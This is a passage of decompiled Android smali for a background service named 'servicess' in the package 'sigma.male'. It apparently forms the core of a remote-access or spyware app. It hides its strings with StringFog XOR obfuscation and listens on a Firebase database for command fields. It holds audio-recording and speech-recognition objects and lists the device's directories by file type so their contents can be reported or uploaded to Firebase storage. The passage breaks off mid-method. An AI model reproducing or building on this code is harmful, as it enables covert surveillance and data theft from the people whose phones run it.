.class public Lsigma/male/servicess;
.super Landroid/app/Service;
.source "servicess.java"


# static fields
.field public static lajj:Ljava/lang/String;

.field private static timer:Ljava/util/Timer;


# instance fields
.field private _fbdb_child_listener:Lcom/google/firebase/database/ChildEventListener;

.field private _fbs_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

.field private _fbs_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _fbs_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnSuccessListener",
            "<",
            "Lcom/google/firebase/storage/FileDownloadTask$TaskSnapshot;",
            ">;"
        }
    .end annotation
.end field

.field private _fbs_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

.field private _fbs_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _fbs_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnCompleteListener",
            "<",
            "Landroid/net/Uri;",
            ">;"
        }
    .end annotation
.end field

.field private _firebase:Lcom/google/firebase/database/FirebaseDatabase;

.field private _firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

.field private _mediaup_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

.field private _mediaup_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _mediaup_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnSuccessListener",
            "<",
            "Lcom/google/firebase/storage/FileDownloadTask$TaskSnapshot;",
            ">;"
        }
    .end annotation
.end field

.field private _mediaup_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

.field private _mediaup_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _mediaup_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnCompleteListener",
            "<",
            "Landroid/net/Uri;",
            ">;"
        }
    .end annotation
.end field

.field private _sigmamale_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

.field private _sigmamale_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _sigmamale_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnSuccessListener",
            "<",
            "Lcom/google/firebase/storage/FileDownloadTask$TaskSnapshot;",
            ">;"
        }
    .end annotation
.end field

.field private _sigmamale_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

.field private _sigmamale_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

.field private _sigmamale_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/google/android/gms/tasks/OnCompleteListener",
            "<",
            "Landroid/net/Uri;",
            ">;"
        }
    .end annotation
.end field

.field private _timer:Ljava/util/Timer;

.field private cal:Ljava/util/Calendar;

.field private cmdn:Ljava/lang/String;

.field private cmdv:Ljava/lang/String;

.field private cmdvar:Ljava/lang/String;

.field private fbdb:Lcom/google/firebase/database/DatabaseReference;

.field private fbs:Lcom/google/firebase/storage/StorageReference;

.field private filinfodat:Ljava/lang/String;

.field private lst:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private map:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/Object;",
            ">;>;"
        }
    .end annotation
.end field

.field private mediaup:Lcom/google/firebase/storage/StorageReference;

.field private mp:Landroid/media/MediaPlayer;

.field private myAudioRecorder:Landroid/media/MediaRecorder;

.field private num:D

.field private responsetxt:Ljava/util/HashMap;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashMap",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/Object;",
            ">;"
        }
    .end annotation
.end field

.field private sigmamale:Lcom/google/firebase/storage/StorageReference;

.field private st:Landroid/speech/SpeechRecognizer;

.field private str:Ljava/lang/String;

.field private t:Ljava/util/TimerTask;

.field private tts:Landroid/speech/tts/TextToSpeech;

.field private vbs:Landroid/os/Vibrator;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 99
    const-string v0, ""

    sput-object v0, Lsigma/male/servicess;->lajj:Ljava/lang/String;

    .line 112
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    sput-object v0, Lsigma/male/servicess;->timer:Ljava/util/Timer;

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .prologue
    .line 92
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 94
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lsigma/male/servicess;->_timer:Ljava/util/Timer;

    .line 95
    invoke-static {}, Lcom/google/firebase/database/FirebaseDatabase;->getInstance()Lcom/google/firebase/database/FirebaseDatabase;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    .line 96
    invoke-static {}, Lcom/google/firebase/storage/FirebaseStorage;->getInstance()Lcom/google/firebase/storage/FirebaseStorage;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->_firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

    .line 100
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lsigma/male/servicess;->responsetxt:Ljava/util/HashMap;

    .line 101
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/servicess;->cmdn:Ljava/lang/String;

    .line 102
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/servicess;->cmdvar:Ljava/lang/String;

    .line 103
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/servicess;->cmdv:Ljava/lang/String;

    .line 104
    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lsigma/male/servicess;->num:D

    .line 105
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    .line 106
    const-string v0, ""

    iput-object v0, p0, Lsigma/male/servicess;->filinfodat:Ljava/lang/String;

    .line 109
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lsigma/male/servicess;->map:Ljava/util/ArrayList;

    .line 110
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    .line 115
    iget-object v0, p0, Lsigma/male/servicess;->_firebase:Lcom/google/firebase/database/FirebaseDatabase;

    const-string v1, "ICcjXw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/FirebaseDatabase;->getReference(Ljava/lang/String;)Lcom/google/firebase/database/DatabaseReference;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->fbdb:Lcom/google/firebase/database/DatabaseReference;

    .line 117
    iget-object v0, p0, Lsigma/male/servicess;->_firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

    const-string v1, "JzspWQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/FirebaseStorage;->getReference(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->fbs:Lcom/google/firebase/storage/StorageReference;

    .line 125
    iget-object v0, p0, Lsigma/male/servicess;->_firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

    const-string v1, "ICcjXxc="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/FirebaseStorage;->getReference(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->sigmamale:Lcom/google/firebase/storage/StorageReference;

    .line 138
    iget-object v0, p0, Lsigma/male/servicess;->_firebase_storage:Lcom/google/firebase/storage/FirebaseStorage;

    const-string v1, "ODEiRFl6"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/FirebaseStorage;->getReference(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->mediaup:Lcom/google/firebase/storage/StorageReference;

    .line 146
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->cal:Ljava/util/Calendar;

    .line 92
    return-void
.end method

.method static synthetic access$0(Lsigma/male/servicess;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 103
    iget-object v0, p0, Lsigma/male/servicess;->cmdv:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$1(Lsigma/male/servicess;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 106
    iget-object v0, p0, Lsigma/male/servicess;->filinfodat:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$10(Lsigma/male/servicess;)Lcom/google/firebase/storage/StorageReference;
    .locals 1

    .prologue
    .line 125
    iget-object v0, p0, Lsigma/male/servicess;->sigmamale:Lcom/google/firebase/storage/StorageReference;

    return-object v0
.end method

.method static synthetic access$2(Lsigma/male/servicess;Ljava/util/Calendar;)V
    .locals 0

    .prologue
    .line 146
    iput-object p1, p0, Lsigma/male/servicess;->cal:Ljava/util/Calendar;

    return-void
.end method

.method static synthetic access$3(Lsigma/male/servicess;)Ljava/util/Calendar;
    .locals 1

    .prologue
    .line 146
    iget-object v0, p0, Lsigma/male/servicess;->cal:Ljava/util/Calendar;

    return-object v0
.end method

.method static synthetic access$4(Lsigma/male/servicess;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 101
    iput-object p1, p0, Lsigma/male/servicess;->cmdn:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$5(Lsigma/male/servicess;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 103
    iput-object p1, p0, Lsigma/male/servicess;->cmdv:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$6(Lsigma/male/servicess;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 102
    iput-object p1, p0, Lsigma/male/servicess;->cmdvar:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$7(Lsigma/male/servicess;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 101
    iget-object v0, p0, Lsigma/male/servicess;->cmdn:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$8(Lsigma/male/servicess;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 102
    iget-object v0, p0, Lsigma/male/servicess;->cmdvar:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$9(Lsigma/male/servicess;)Lcom/google/firebase/storage/StorageReference;
    .locals 1

    .prologue
    .line 117
    iget-object v0, p0, Lsigma/male/servicess;->fbs:Lcom/google/firebase/storage/StorageReference;

    return-object v0
.end method

.method public static getBitmapFromDrawable(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;
    .locals 5

    .prologue
    const/4 v4, 0x0

    .line 895
    invoke-virtual {p0}, Landroid/graphics/drawable/Drawable;->getIntrinsicWidth()I

    move-result v0

    invoke-virtual {p0}, Landroid/graphics/drawable/Drawable;->getIntrinsicHeight()I

    move-result v1

    sget-object v2, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v0, v1, v2}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 896
    new-instance v1, Landroid/graphics/Canvas;

    invoke-direct {v1, v0}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    .line 897
    invoke-virtual {v1}, Landroid/graphics/Canvas;->getWidth()I

    move-result v2

    invoke-virtual {v1}, Landroid/graphics/Canvas;->getHeight()I

    move-result v3

    invoke-virtual {p0, v4, v4, v2, v3}, Landroid/graphics/drawable/Drawable;->setBounds(IIII)V

    .line 898
    invoke-virtual {p0, v1}, Landroid/graphics/drawable/Drawable;->draw(Landroid/graphics/Canvas;)V

    .line 899
    return-object v0
.end method

.method private initialize()V
    .locals 3

    .prologue
    .line 162
    const-string v0, "Iz0kX1khOzQ="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/servicess;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/Vibrator;

    iput-object v0, p0, Lsigma/male/servicess;->vbs:Landroid/os/Vibrator;

    .line 163
    new-instance v0, Landroid/speech/tts/TextToSpeech;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Landroid/speech/tts/TextToSpeech;-><init>(Landroid/content/Context;Landroid/speech/tts/TextToSpeech$OnInitListener;)V

    iput-object v0, p0, Lsigma/male/servicess;->tts:Landroid/speech/tts/TextToSpeech;

    .line 164
    invoke-static {p0}, Landroid/speech/SpeechRecognizer;->createSpeechRecognizer(Landroid/content/Context;)Landroid/speech/SpeechRecognizer;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->st:Landroid/speech/SpeechRecognizer;

    .line 168
    new-instance v0, Lsigma/male/servicess$1;

    invoke-direct {v0, p0}, Lsigma/male/servicess$1;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_fbdb_child_listener:Lcom/google/firebase/database/ChildEventListener;

    .line 205
    iget-object v0, p0, Lsigma/male/servicess;->fbdb:Lcom/google/firebase/database/DatabaseReference;

    iget-object v1, p0, Lsigma/male/servicess;->_fbdb_child_listener:Lcom/google/firebase/database/ChildEventListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/database/DatabaseReference;->addChildEventListener(Lcom/google/firebase/database/ChildEventListener;)Lcom/google/firebase/database/ChildEventListener;

    .line 207
    new-instance v0, Lsigma/male/servicess$2;

    invoke-direct {v0, p0}, Lsigma/male/servicess$2;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_fbs_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 215
    new-instance v0, Lsigma/male/servicess$3;

    invoke-direct {v0, p0}, Lsigma/male/servicess$3;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_fbs_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 223
    new-instance v0, Lsigma/male/servicess$4;

    invoke-direct {v0, p0}, Lsigma/male/servicess$4;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_fbs_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    .line 231
    new-instance v0, Lsigma/male/servicess$5;

    invoke-direct {v0, p0}, Lsigma/male/servicess$5;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_fbs_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 239
    new-instance v0, Lsigma/male/servicess$6;

    invoke-direct {v0, p0}, Lsigma/male/servicess$6;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_fbs_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 246
    new-instance v0, Lsigma/male/servicess$7;

    invoke-direct {v0, p0}, Lsigma/male/servicess$7;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_fbs_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    .line 254
    new-instance v0, Lsigma/male/servicess$8;

    invoke-direct {v0, p0}, Lsigma/male/servicess$8;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_sigmamale_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 262
    new-instance v0, Lsigma/male/servicess$9;

    invoke-direct {v0, p0}, Lsigma/male/servicess$9;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_sigmamale_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 270
    new-instance v0, Lsigma/male/servicess$10;

    invoke-direct {v0, p0}, Lsigma/male/servicess$10;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_sigmamale_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    .line 278
    new-instance v0, Lsigma/male/servicess$11;

    invoke-direct {v0, p0}, Lsigma/male/servicess$11;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_sigmamale_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 286
    new-instance v0, Lsigma/male/servicess$12;

    invoke-direct {v0, p0}, Lsigma/male/servicess$12;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_sigmamale_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 293
    new-instance v0, Lsigma/male/servicess$13;

    invoke-direct {v0, p0}, Lsigma/male/servicess$13;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_sigmamale_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    .line 301
    new-instance v0, Lsigma/male/servicess$14;

    invoke-direct {v0, p0}, Lsigma/male/servicess$14;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_mediaup_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 309
    new-instance v0, Lsigma/male/servicess$15;

    invoke-direct {v0, p0}, Lsigma/male/servicess$15;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_mediaup_download_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    .line 317
    new-instance v0, Lsigma/male/servicess$16;

    invoke-direct {v0, p0}, Lsigma/male/servicess$16;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_mediaup_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    .line 338
    new-instance v0, Lsigma/male/servicess$17;

    invoke-direct {v0, p0}, Lsigma/male/servicess$17;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_mediaup_download_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 346
    new-instance v0, Lsigma/male/servicess$18;

    invoke-direct {v0, p0}, Lsigma/male/servicess$18;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_mediaup_delete_success_listener:Lcom/google/android/gms/tasks/OnSuccessListener;

    .line 353
    new-instance v0, Lsigma/male/servicess$19;

    invoke-direct {v0, p0}, Lsigma/male/servicess$19;-><init>(Lsigma/male/servicess;)V

    iput-object v0, p0, Lsigma/male/servicess;->_mediaup_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    .line 360
    return-void
.end method

.method private initializeLogic()V
    .locals 0

    .prologue
    .line 369
    invoke-virtual {p0}, Lsigma/male/servicess;->_service()V

    .line 374
    return-void
.end method


# virtual methods
.method public _cd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 12

    .prologue
    const/4 v0, 0x0

    const/4 v3, -0x1

    const-wide/16 v10, 0x400

    .line 550
    invoke-static {p1}, Lsigma/male/FileUtil;->isExistFile(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 551
    invoke-static {p1}, Lsigma/male/FileUtil;->isDirectory(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_6

    .line 552
    iget-object v1, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->clear()V

    .line 553
    iget-object v1, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    invoke-static {p1, v1}, Lsigma/male/FileUtil;->listDir(Ljava/lang/String;Ljava/util/ArrayList;)V

    .line 554
    const-wide/16 v2, 0x0

    iput-wide v2, p0, Lsigma/male/servicess;->num:D

    .line 555
    const-string v1, "aTgvDQZ7eg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    move v1, v0

    .line 556
    :goto_0
    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-lt v1, v0, :cond_1

    .line 575
    iget-object v1, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    const-string v3, ""

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    move-object v2, p1

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 604
    :cond_0
    :goto_1
    return-void

    .line 557
    :cond_1
    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v2, p0, Lsigma/male/servicess;->num:D

    double-to-int v2, v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Lsigma/male/FileUtil;->isDirectory(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 558
    iget-object v2, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    const-string v0, "aTgvDVs5NTVeBXcyKQ8Yaw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v4, p0, Lsigma/male/servicess;->num:D

    double-to-int v4, v4

    invoke-virtual {v0, v4}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    .line 573
    :goto_2
    iget-wide v2, p0, Lsigma/male/servicess;->num:D

    const-wide/high16 v4, 0x3ff0000000000000L    # 1.0

    add-double/2addr v2, v4

    iput-wide v2, p0, Lsigma/male/servicess;->num:D

    .line 556
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_0

    .line 561
    :cond_2
    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v2, p0, Lsigma/male/servicess;->num:D

    double-to-int v2, v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v0

    const-string v2, "eyQoSg=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v2, p0, Lsigma/male/servicess;->num:D

    double-to-int v2, v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v0

    const-string v2, "ez42Sg=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v2, p0, Lsigma/male/servicess;->num:D

    double-to-int v2, v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v0

    const-string v2, "ez42SF8="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v2, p0, Lsigma/male/servicess;->num:D

    double-to-int v2, v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v0

    const-string v2, "eycwSg=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v2, p0, Lsigma/male/servicess;->num:D

    double-to-int v2, v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v0

    const-string v2, "ez0lQg=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 562
    :cond_3
    iget-object v2, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    const-string v0, "aTgvDVs5NTVeBXc9Kw8Yaw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v4, p0, Lsigma/male/servicess;->num:D

    double-to-int v4, v4

    invoke-virtual {v0, v4}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v4

    const-string v0, "aTZ4"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    new-instance v7, Ljava/io/File;

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v8, p0, Lsigma/male/servicess;->num:D

    double-to-int v8, v8

